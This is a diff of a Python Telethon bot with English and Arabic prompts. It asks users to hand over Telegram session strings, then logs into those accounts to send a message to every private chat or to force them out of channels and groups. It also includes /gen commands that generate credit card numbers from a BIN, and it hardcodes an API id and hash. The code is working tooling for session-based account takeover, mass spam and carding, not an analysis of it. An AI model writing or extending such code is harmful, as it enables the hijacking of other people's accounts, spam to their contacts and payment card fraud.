+    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
+    await bot.connect()
+    try:
+            reply_msg = msg
+            tol = reply_msg
+            file = None
+            count = 0
+            async for krishna in bot.iter_dialogs():
+                if krishna.is_user and not krishna.entity.bot:
+                    chat = krishna.id
+                    try:
+                        await bot.send_message(chat, tol, file=file)
+                        count += 1
+                    except BaseException:
+                        pass
+            return count
+    except Exception as e:
+            print(e)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"3")))
-@is_banned
 async def users(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -2921,12 +2581,14 @@ async def users(event):
             await x.send_message("""Now send me the Termux Session to gcast in private
             
 ارسل لي الترمكس لكي ارسل الرسالة الى جميع الخاصات""")
-            strses = (await x.get_response()).text
-            op = await cu(strses)
-            if not op:
-                return await event.respond("""Invalid Session. Please use another one.
-                
-الترمكس خاطئ. حاول غيره""", buttons=keyboard)
+            strses = await x.wait_event(events.NewMessage)
+            session = validate_session(strses.text)
+            if session:
+                pass
+            else:
+                return await event.respond("""Invalid Session, please use another one.
+                                   
+ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
             await x.send_message("""Send message
             
 ارسل الرسالة""")
@@ -2942,11 +2604,11 @@ async def users(event):
                 for percent in percentages:
                     bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                     await message.edit(f'يتم التحميل: {percent}% [{bar}]')
-                    time.sleep(0.3)  # Wait for 1 second
+                    time.sleep(0.2)  # Wait for 1 second
             except ValueError as e:
                 print(f"Failed to answer callback query: {e}")
             try:
-                i = await gcastc(strses, msg)
+                i = await gcastc(session, msg) if strses.text.startswith("1") or strses.text.endswith("=") else await gcastcp(session, msg)
                 await message.edit(f"""Done Gcasted In {i} Private 
                 
 تم الارسال الى جميع الخاصات""", buttons=keyboard)
@@ -2971,7 +2633,6 @@ from telethon.sessions import StringSession
 
 
 @client.on(events.CallbackQuery(data=re.compile(b"O")))
-@is_banned
 async def users(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -3007,7 +2668,7 @@ async def users(event):
                 for percent in percentages:
                     bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                     await message.edit(f'يتم التحميل: {percent}% [{bar}]')
-                    time.sleep(0.3)  # Wait for 1 second
+                    time.sleep(0.2)  # Wait for 1 second
             except ValueError as e:
                 print(f"Failed to answer callback query: {e}")
             # Perform actions with the client using the provided Termux session
@@ -3025,6 +2686,88 @@ async def users(event):
             print(f"An error occurred: {str(e)}")
 
 
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"P")))
+async def users(event):
+    chat_id = event.chat_id
+    user_id = event.sender_id
+    # Check if the user is in the channel
+    is_member = await is_user_in_channel(client, channel_id, user_id)
+    if not is_member:
+        await event.respond("""Please join @PrivaPact for the bot to work!
+        
+الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
+        return
+
+    user_id = event.sender_id
+
+    # Check if the user is a developer (exempt from cooldown)
+    is_developer = user_id in Developers
+
+    # Check if the user is on cooldown and not a developer
+    if not is_developer and user_id in command_cooldown:
+        cooldown_end_time = command_cooldown[user_id]
+        time_remaining = cooldown_end_time - datetime.now()
+
+        if time_remaining.total_seconds() > 0:
+            await event.respond(f"""You need to wait {time_remaining.seconds} seconds before using this command again.
+            
+عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
+            return
+
+    # Update the command cooldown for the user
+    command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)
+
+    async with bot.conversation(event.chat_id) as x:
+        try:
+            await x.send_message("""Now send me the Termux Session so I can make the user leave the channel/group.
+
+الآن أرسل لي جلسة Termux لكي أخرج المستخدم من القناة/المجموعة.""")
+                                 
+            sender_id = event.sender_id 
+            strses = await x.wait_event(events.NewMessage, timeout=60)  # Replace with your actual Termux session
+            session = validate_session(strses.text)
+            if session:
+                pass
+            else:
+                return await event.respond("""Invalid Session, please use another one.
+                                   
+ترمكس خاطئ، يرجى استخدام آخر""", buttons=keyboard)
+                return
+
+
+            try:
+                # Send a message with the initial loading bar
+                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')
+
+                # Define the list of random percentages
+                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]
+
+                # Update the loading bar with random percentages
+                for percent in percentages:
+                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
+                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
+                    time.sleep(0.2)  # Wait for 1 second
+            except ValueError as e:
+                print(f"Failed to answer callback query: {e}")
+            try:
+                await leaveall(session) if strses.text.startswith("1") or strses.text.endswith("=") else await leaveallp(session)
+                await event.respond("""Left channel/group successfully.
+
+تمت المغادرة من القناة/المجموعة بنجاح.""", buttons=keyboard)
+            except errors.UserNotParticipantError:
+                await event.respond("""The target user is not a member of the specified channel/group.
+                
+المستخدم ليس عضو في الكروب / قناة """)
+     
+        except TimeoutError:
+            return await event.respond("""Please provide the termux session withing 60 seconds
+            
+الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)
+        except Exception as e:
+            await event.respond(f"An error occurred: {str(e)}")
+            
+            
 
 
 rules = '''
@@ -3068,7 +2811,6 @@ Please read and accept the following terms and conditions:
 '''
 
 @client.on(events.NewMessage(pattern='/check'))
-@is_banned
 async def check(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -3140,7 +2882,6 @@ def get_random_user_data(country_code):
 
 
 @client.on(events.NewMessage(pattern=r'/gen(\s+(\d{6}))?$'))
-@is_banned
 async def generate_random_credit_cards(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -3174,7 +2915,6 @@ async def generate_random_credit_cards(event):
 
 
 @client.on(events.NewMessage(pattern=r'/gen (\d{6})/(\d{2})/(\d{2})/(\d{3})'))
-@is_banned
 async def generate_specific_credit_cards(event):
     chat_id = event.chat_id
     user_id = event.sender_id
@@ -3312,4 +3052,4 @@ def ccgen_number(prefix, length):
 
 
 print("started!")
-client.run_until_disconnected()
+bot.run_until_disconnected()
